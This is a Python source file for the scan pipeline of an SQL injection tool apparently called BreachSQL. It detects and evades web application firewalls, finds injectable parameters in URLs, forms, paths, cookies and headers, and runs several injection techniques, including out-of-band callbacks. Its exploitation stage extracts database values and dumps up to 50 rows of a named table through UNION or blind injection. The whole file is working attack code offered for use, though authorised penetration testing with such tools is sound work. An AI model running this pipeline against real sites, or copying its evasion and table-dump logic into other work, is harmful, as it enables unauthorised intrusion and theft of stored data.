# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""
BreachSQL — engine/_scanner/pipeline.py
Scan pipeline: WAF → passive → surface building → active → time-blind → OOB.
"""

from __future__ import annotations

import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any, Dict, List

from ..log import get_logger
from .. import crawler as crawler_mod
from ..http import waf_detect
from ..http.injector import Injector, parse_post_data
from ..reporter import ScanResult
from .options import ScanOptions
from .passive import fetch_seed, run_passive_checks
from .active import scan_param
from .blind import run_time_based, run_oob
from .stacked import run_stacked
from .extract import extract_value, extract_via_union
from commonhuman_payloads.sqli import get_extraction_targets
from ..reporter import ExtractionFinding

logger = get_logger("breachsql.pipeline")


def run(url: str, opts: ScanOptions, injector: Injector, result: ScanResult) -> None:

    # 1. WAF detection
    logger.debug("Probing for WAF on %s", url)
    params = injector.get_params(url)
    first_param = params[0] if params else None
    waf_result = waf_detect.detect(injector, url, first_param)

    if waf_result.detected:
        result.waf_detected    = waf_result.name
        result.evasion_applied = waf_result.evasions[0] if waf_result.evasions else None
        logger.warning("WAF detected: %s (confidence: %s)", waf_result.name, waf_result.confidence)
    else:
        logger.debug("No WAF detected")

    evasions: List[str] = waf_result.evasions if waf_result.evasions else ["none"]

    # 2. Passive checks
    seed_resp = fetch_seed(injector, url)
    run_passive_checks(url, seed_resp, injector, result)

    # 3. Build injectable surfaces
    surfaces: List[Dict[str, Any]] = []
    for param in injector.get_params(url):
        surfaces.append({"url": url, "method": "GET", "params": {param: ""}, "single_param": param})

    if opts.data:
        post_params = parse_post_data(opts.data)
        _is_json_body = opts.data.strip().startswith("{")
        for param in post_params:
            surfaces.append({
                "url": url, "method": "POST",
                "params": post_params, "single_param": param,
                "json_body": _is_json_body,
            })

    # Path parameter surfaces — inject into URL path segments.
    # Detect :name / {name} placeholders in the path, or use --path-params names.
    import urllib.parse as _up
    _path_parts = _up.urlparse(url).path.split("/")
    # Map param name -> segment index
    _path_param_indices: dict = {}
    if opts.path_params:
        # User supplied explicit names; match against path parts
        for _i, _part in enumerate(_path_parts):
            # Strip placeholder syntax if present
            _plain = _part.lstrip(":").strip("{}")
            if _plain in opts.path_params:
                _path_param_indices[_plain] = _i
        # Also accept positional names that don't appear literally in the path
        # (e.g. the user knows segment 3 is "id") — use index order as fallback
        for _name in opts.path_params:
            if _name not in _path_param_indices:
                # Prefer numeric-looking segments (REST id values) over word segments
                def _is_numeric(s: str) -> bool:
                    return s.lstrip("-").isdigit()
                # First pass: numeric segments
                for _i, _part in enumerate(_path_parts):
                    if (_i not in _path_param_indices.values() and _part
                            and not _part.startswith("{") and not _part.startswith(":")
                            and _is_numeric(_part)):
                        _path_param_indices[_name] = _i
                        break
                # Second pass: any non-empty non-placeholder segment
                if _name not in _path_param_indices:
                    for _i, _part in enumerate(_path_parts):
                        if (_i not in _path_param_indices.values() and _part
                                and not _part.startswith("{") and not _part.startswith(":")):
                            _path_param_indices[_name] = _i
                            break
    else:
        # Auto-detect :name and {name} patterns
        for _i, _part in enumerate(_path_parts):
            if _part.startswith(":") and len(_part) > 1:
                _path_param_indices[_part[1:]] = _i
            elif _part.startswith("{") and _part.endswith("}"):
                _path_param_indices[_part[1:-1]] = _i

    for _pname, _pidx in _path_param_indices.items():
        surfaces.append({
            "url": url, "method": "PATH",
            "params": {_pname: _path_parts[_pidx]},
            "single_param": _pname,
            "path_index": _pidx,
        })

    # Cookie parameter surfaces — inject into specified cookie names.
    if opts.cookie_params:
        _cookie_jar = injector._session.cookies.get_dict() if hasattr(injector, '_session') else {}
        for _cname in opts.cookie_params:
            _cval = _cookie_jar.get(_cname, "")
            surfaces.append({
                "url": url, "method": "COOKIE",
                "params": {_cname: _cval},
                "single_param": _cname,
            })

    # HTTP header injection surfaces — inject into specified header names.
    if opts.header_params:
        for _hname in opts.header_params:
            surfaces.append({
                "url": url, "method": "HEADER",
                "params": {_hname: ""},
                "single_param": _hname,
            })

    if opts.crawl:
        logger.debug("Crawling %s (max_pages=%s, depth=%s)", url, opts.max_pages, opts.max_depth)
        crawl_result = crawler_mod.crawl(
            start_url=url, injector=injector,
            max_pages=opts.max_pages, max_depth=opts.max_depth, threads=opts.threads,
            exclude_patterns=opts.exclude_patterns or [],
        )
        result.crawled_urls = len(crawl_result.visited_urls)
        logger.debug(
            "Crawled %d URLs, found %d forms",
            result.crawled_urls, len(crawl_result.form_targets),
        )
        for page_url, page_params in crawl_result.url_params:
            for param in page_params:
                surfaces.append({
                    "url": page_url, "method": "GET",
                    "params": {param: ""}, "single_param": param,
                })
        for form in crawl_result.form_targets:
            for param in form.params:
                surfaces.append({
                    "url": form.action, "method": form.method,
                    "params": {**form.base_data, **form.params}, "single_param": param,
                })
        # Level 2: probe numeric path segments discovered via <code> tags or
        # other non-href links (e.g. /api/items/1 → inject into "1").
        if opts.level >= 2:
            seen_path_surfaces: set = set()
            for pp_url in crawl_result.path_param_candidates:
                _pp_parts = _up.urlparse(pp_url).path.split("/")
                for _i, _part in enumerate(_pp_parts):
                    if _part and _part.lstrip("-").isdigit():
                        _key = (pp_url, _i)
                        if _key not in seen_path_surfaces:
                            seen_path_surfaces.add(_key)
                            surfaces.append({
                                "url": pp_url, "method": "PATH",
                                "params": {"id": _part},
                                "single_param": "id",
                                "path_index": _i,
                            })
                        break  # inject only the first numeric segment
    else:
        pass  # crawler not enabled; surfaces already built from URL params and POST data

    if surfaces:
        logger.info("%d injectable surface(s) identified", len(surfaces))
    else:
        logger.debug("0 injectable surfaces identified")
    result.params_tested = len(surfaces)

    # 4. Active: error-based + boolean + union (threaded)
    if opts.use_error or opts.use_boolean or opts.use_union:
        with ThreadPoolExecutor(max_workers=opts.threads) as pool:
            futs = [
                pool.submit(scan_param, s, evasions, opts, injector, result)
                for s in surfaces
            ]
            for f in as_completed(futs):
                try:
                    f.result()
                except Exception as exc:
                    result.append_error(str(exc))

    # 5. Time-based blind (sequential — timing sensitive, threading skews results)
    if opts.use_time:
        confirmed = {
            (f.url, f.parameter, f.method)
            for lst in (result.error_based, result.boolean_based, result.union_based)
            for f in lst
        }
        time_surfaces = [
            s for s in surfaces
            if (s["url"], s["single_param"], s["method"]) not in confirmed
        ]
        logger.debug("Running time-based blind detection (%d surfaces)", len(time_surfaces))
        for surface in time_surfaces:
            try:
                run_time_based(surface, evasions, opts, injector, result)
            except Exception as exc:
                result.append_error(str(exc))

    # 6. OOB injection (threaded — fire and forget)
    if opts.use_oob:
        logger.info("Injecting OOB payloads (callback: %s)", opts.oob_callback)
        with ThreadPoolExecutor(max_workers=opts.threads) as pool:
            futs = [
                pool.submit(run_oob, s, evasions, opts, injector, result)
                for s in surfaces
            ]
            for f in as_completed(futs):
                try:
                    f.result()
                except Exception as exc:
                    result.append_error(str(exc))

    # 7. Stacked (batched) queries (sequential — order matters for detection)
    if opts.use_stacked:
        logger.debug("Running stacked query detection (%d surfaces)", len(surfaces))
        for surface in surfaces:
            try:
                run_stacked(surface, evasions, opts, injector, result)
            except Exception as exc:
                result.append_error(str(exc))

    # 8. Exploitation — extract proof-of-impact data via confirmed injection
    if opts.exploit and (result.boolean_based or result.time_based
                         or result.union_based or result.error_based):
        _run_exploit(url, opts, evasions, injector, result, surfaces)


def _run_exploit(
    url: str,
    opts: ScanOptions,
    evasions: List[str],
    injector: Injector,
    result: ScanResult,
    surfaces: List[Dict[str, Any]],
) -> None:
    """Extract proof-of-impact data and optionally dump a table."""

    dbms = (result.dbms_detected or opts.dbms or "auto").lower()
    targets = get_extraction_targets(dbms)

    if opts.dump:
        _tbl = opts.dump
        if dbms in ("sqlite", "postgres", "postgresql"):
            dump_expr = f"(SELECT GROUP_CONCAT(c, '|') FROM (SELECT * FROM \"{_tbl}\" LIMIT 50) t)"
        elif dbms in ("mssql",):
            dump_expr = f"(SELECT STRING_AGG(CAST(c AS NVARCHAR(MAX)),'|') FROM (SELECT * FROM [{_tbl}]) t)"
        else:
            dump_expr = (
                f"(SELECT GROUP_CONCAT(CAST(c AS CHAR) SEPARATOR '|')"
                f" FROM (SELECT CONCAT_WS(',', *) AS c FROM `{_tbl}` LIMIT 50) t)"
            )
        targets = targets + [(f"dump:{_tbl}", dump_expr)]

    # Prefer UNION extraction (one request per target, no binary search)
    if result.union_based:
        union_finding = result.union_based[0]
        surface = next(
            (s for s in surfaces
             if s["url"] == union_finding.url
             and s["single_param"] == union_finding.parameter
             and s["method"] == union_finding.method),
            None,
        )
        if surface is not None:
            logger.info("Extracting %d target(s) via UNION on %s [%s]",
                        len(targets), union_finding.parameter, union_finding.url)
            for label, expr in targets:
                try:
                    value = extract_via_union(
                        expr=expr,
                        union_finding=union_finding,
                        surface=surface,
                        evasions=evasions,
                        opts=opts,
                        injector=injector,
                    )
                    if value:
                        logger.info("[EXTRACTED] %s = %s", label, value)
                        result.extracted.append(ExtractionFinding(
                            url=union_finding.url,
                            parameter=union_finding.parameter,
                            method=union_finding.method,
                            expr=expr,
                            value=value,
                            mode="union",
                        ))
                    else:
                        logger.debug("extract: no value returned for %s", label)
                except Exception as exc:
                    result.append_error(f"Extraction failed ({label}): {exc}")
            return

    # Fall back to boolean / time-blind extraction
    best_finding = None
    mode = "boolean"
    if result.boolean_based:
        best_finding = result.boolean_based[0]
    elif result.time_based:
        best_finding = result.time_based[0]
        mode = "time"

    if best_finding is None:
        return

    surface = next(
        (s for s in surfaces
         if s["url"] == best_finding.url
         and s["single_param"] == best_finding.parameter
         and s["method"] == best_finding.method),
        None,
    )
    if surface is None:
        return

    try:
        from .active import _fetch
        baseline_resp = _fetch(
            injector, best_finding.url, best_finding.method,
            surface["params"], best_finding.parameter, "",
            json_body=surface.get("json_body", False),
            path_index=surface.get("path_index", 0),
        )
        baseline = baseline_resp if baseline_resp is not None else ""
    except Exception:
        baseline = ""

    logger.info("Extracting %d target(s) via %s-blind on %s [%s]",
                len(targets), mode, best_finding.parameter, best_finding.url)

    for label, expr in targets:
        try:
            value = extract_value(
                expr=expr,
                surface=surface,
                evasions=evasions,
                opts=opts,
                injector=injector,
                baseline=baseline,
                mode=mode,
            )
            if value:
                logger.info("[EXTRACTED] %s = %s", label, value)
                result.extracted.append(ExtractionFinding(
                    url=best_finding.url,
                    parameter=best_finding.parameter,
                    method=best_finding.method,
                    expr=expr,
                    value=value,
                    mode=mode,
                ))
            else:
                logger.debug("extract: no value returned for %s", label)
        except Exception as exc:
            result.append_error(f"Extraction failed ({label}): {exc}")
